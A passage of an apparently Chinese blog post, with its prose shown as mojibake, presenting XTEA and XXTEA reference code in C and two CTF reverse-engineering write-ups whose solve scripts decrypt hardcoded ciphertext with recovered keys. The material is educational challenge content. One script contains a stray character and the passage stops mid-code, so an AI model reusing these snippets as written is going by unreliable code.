title="xTEA"></a>xTEA</h2><p>XTEA æ˜¯ TEA çš„å‡çº§ç‰ˆï¼š</p><p>XTEA ç®—æ³•çš„åŠ å¯†å’Œè§£å¯†è¿‡ç¨‹éƒ½æ˜¯ç”±å¤šè½®è¿­ä»£å®Œæˆçš„ã€‚æ¯è½®è¿­ä»£éƒ½åŒ…æ‹¬å››ä¸ªæ­¥éª¤ï¼šè½®å¯†é’¥åŠ ã€ä»£æ¢ã€ç½®æ¢å’Œè½®å¯†é’¥åŠ ã€‚å…¶ä¸­ï¼Œä»£æ¢å’Œç½®æ¢æ­¥éª¤æ˜¯ XTEA ç®—æ³•çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚XTEA ç®—æ³•æ˜¯ TEA ç®—æ³•çš„é­”æ”¹ç®—æ³•ã€‚XTEA ç®—æ³•å››ä¸ªå­å¯†é’¥é‡‡å–ä¸æ­£è§„çš„æ–¹å¼è¿›è¡Œæ··åˆä»¥é˜»æ­¢å¯†é’¥è¡¨æ”»å‡»ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/xtea.png" alt="xtea"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r=<span class="number">32</span>;<span class="comment">//num_roundså»ºè®®å–å€¼ä¸º32</span></span><br><span class="line">    <span class="comment">// vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•°</span></span><br><span class="line">    <span class="comment">// kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åŠ å¯†å‰åŸå§‹æ•°æ®ï¼š%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">encipher</span>(r, v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åŠ å¯†åçš„æ•°æ®ï¼š%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">decipher</span>(r, v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è§£å¯†åçš„æ•°æ®ï¼š%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="xxTEA"><a href="#xxTEA" class="headerlink" title="xxTEA"></a>xxTEA</h2><p>XXtea ç®—æ³•çš„åŸºæœ¬åŸç†æ˜¯å°†æ˜æ–‡åˆ†æˆè‹¥å¹²ä¸ªå›ºå®šé•¿åº¦çš„å—ï¼Œç„¶åå¯¹æ¯ä¸ªå—è¿›è¡ŒåŠ å¯†ã€‚åŠ å¯†è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨ä¸€ä¸ªå¯†é’¥å¯¹æ¯ä¸ªå—è¿›è¡ŒåŠ å¯†ï¼Œç„¶åå°†åŠ å¯†åçš„å—æ‹¼æ¥åœ¨ä¸€èµ·å½¢æˆå¯†æ–‡ã€‚<br>è§£å¯†è¿‡ç¨‹ä¸åŠ å¯†è¿‡ç¨‹ç›¸åã€‚ä½¿ç”¨ç›¸åŒçš„å¯†é’¥å¯¹å¯†æ–‡è¿›è¡Œè§£å¯†ï¼Œç„¶åå°†è§£å¯†åçš„å—æ‹¼æ¥åœ¨ä¸€èµ·å½¢æˆæ˜æ–‡ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/xxtea.png" alt="xxtea"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>]= &#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n= <span class="number">2</span>; <span class="comment">//nçš„ç»å¯¹å€¼è¡¨ç¤ºvçš„é•¿åº¦ï¼Œå–æ­£è¡¨ç¤ºåŠ å¯†ï¼Œå–è´Ÿè¡¨ç¤ºè§£å¯†</span></span><br><span class="line">    <span class="comment">// vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•°</span></span><br><span class="line">    <span class="comment">// kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åŠ å¯†å‰åŸå§‹æ•°æ®ï¼š%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">btea</span>(v, n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åŠ å¯†åçš„æ•°æ®ï¼š%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">btea</span>(v, -n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è§£å¯†åçš„æ•°æ®ï¼š%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="ã€xxteaã€‘happytime-elfï¼ˆåŒæ—¶ä¹Ÿç»ƒä¸€ä¸‹ç›‘å¬è°ƒè¯•ï¼‰"><a href="#ã€xxteaã€‘happytime-elfï¼ˆåŒæ—¶ä¹Ÿç»ƒä¸€ä¸‹ç›‘å¬è°ƒè¯•ï¼‰" class="headerlink" title="ã€xxteaã€‘happytime.elfï¼ˆåŒæ—¶ä¹Ÿç»ƒä¸€ä¸‹ç›‘å¬è°ƒè¯•ï¼‰"></a>ã€xxteaã€‘happytime.elfï¼ˆåŒæ—¶ä¹Ÿç»ƒä¸€ä¸‹ç›‘å¬è°ƒè¯•ï¼‰</h2><p>ç›‘å¬å‰ç½®å·¥ä½œï¼š</p><p>å°† ida ä¸­çš„ linux_server64 æ‹–å…¥åˆ° linux ä¸­</p><p>æ‹–å…¥å chmod + x linux_server64 chmod +x ä½ çš„å¾…è°ƒè¯•æ–‡ä»¶åç»™äºˆæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig æŸ¥è¯¢ip</span><br><span class="line">./linux_server64è¿›è¡Œç›‘å¬</span><br></pre></td></tr></table></figure><p>æŸ¥å…‹æ— å£³ ida</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/happytime01.png" alt="happytime01"></p><p>è·Ÿè¿› cry</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/happytime-cry.png" alt="happytime-cry"></p><p>å‘ç°æ˜¯ xxteaï¼Œæ‰¾äº†ä¸€ä¸ª xxtea çš„ç®—æ³•æ¨¡æ¿è¿›è¡Œç›¸å…³ä¿®æ”¹</p><p>é‚£ä¹ˆç¬¬ä¸€ä¸ªå›¾çš„ v5 å°±æ˜¯ keyï¼Œv6 å°±æ˜¯å¯†æ–‡</p><p>è¿™é‡Œç›´æ¥ç”¨è½®æ•°ä¼šå‡ºé—®é¢˜æ‰€ä»¥ç”¨äº†ä¸‹åŠ¨è°ƒç›´æ¥å°†åŠ å¯†åè½®æ•°å¾—å‡º</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/%E5%81%B7%E6%87%92%E5%8A%A8%E8%B0%83.jpg" alt="å·æ‡’åŠ¨è°ƒ"></p><p>exp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x61C88647</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX ( ( (z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4) ) ^ ( (sum^y) + (key[(p&amp;3)^e] ^ z) ) )</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">415</span> / n + <span class="number">114</span>;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">415</span> / n + <span class="number">114</span>;</span><br><span class="line">        sum =  <span class="number">0x52b8cc1f</span>;<span class="comment">//rounds*DELTA;</span></span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">11</span>]= &#123;<span class="number">0x480AC20C</span>,<span class="number">0xCE9037F2</span>,<span class="number">0x8C212018</span>,<span class="number">0xE92A18D</span>,<span class="number">0xA4035274</span>,<span class="number">0x2473AAB1</span>,<span class="number">0xA9EFDB58</span>,<span class="number">0xA52CC5C8</span>,<span class="number">0xE432CB51</span>,<span class="number">0xD04E9223</span>,<span class="number">0x6FD07093</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">0x79696755</span>,<span class="number">0x67346F6C</span>,<span class="number">0x69231231</span>,<span class="number">0x5F674231</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n= <span class="number">11</span>;</span><br><span class="line">   <span class="comment">// btea(v, n, k);</span></span><br><span class="line">   <span class="comment">//printf(&quot;0x%0x&quot;,k[3]);</span></span><br><span class="line">    <span class="built_in">btea</span>(v, -n, k);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,v);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ã€xxteaã€‘-NewStarCTF-å…¬å¼€èµ›èµ›é“-EzTea"><a href="#ã€xxteaã€‘-NewStarCTF-å…¬å¼€èµ›èµ›é“-EzTea" class="headerlink" title="ã€xxteaã€‘[NewStarCTF å…¬å¼€èµ›èµ›é“]EzTea"></a>ã€xxteaã€‘[NewStarCTF å…¬å¼€èµ›èµ›é“]EzTea</h2><p>å¯ä»¥çœ‹çœ‹è¿™ä½å¸ˆå‚…çš„ blogï¼š<a href="https://www.cnblogs.com/Only-xiaoxiao/p/16759891.html">https://www.cnblogs.com/Only-xiaoxiao/p/16759891.html</a></p><p>æŸ¥å…‹æ— å£³ ida</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/newstarCtf01.png" alt="newstarCtf01"></p><p>è¿™æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡ŒåŠ å¯†åä¸é¢„å®šå¯†æ–‡æ¯”å¯¹ï¼Œ</p><p>è·Ÿè¿›æŸ¥çœ‹ sub_140011c0</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/newstarCtf02.png" alt="newstarCtf02"></p><p>å‘ç°è¿˜æ˜¯ xxtea</p><p>å›åˆ°å‰é¢è·Ÿè¿›æŸ¥çœ‹ unk_140004038 è·å¾— key</p><p>æŸ¥çœ‹ dword_140004038 è·å¾—å¯†æ–‡</p><p>exp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x11451400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z ^ (key[(e ^ p) &amp; 3])) + (y ^ sum)) ^ (((32 * z) ^ (y &gt;&gt; 3)) + ((4 * y) ^ (z &gt;&gt; 4))))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n ;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;A</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">     n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n ;</span><br><span class="line">        sum =  rounds*DELTA;<span class="comment">/*0xbdf7dc00*/</span>;</span><br><span class="line">        <span class="comment">//è¿™æ¬¡å¯ä»¥ç”¨round*å¸¸æ•°ï¼Œä¹Ÿå¯ä»¥åŠ¨è°ƒ</span></span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    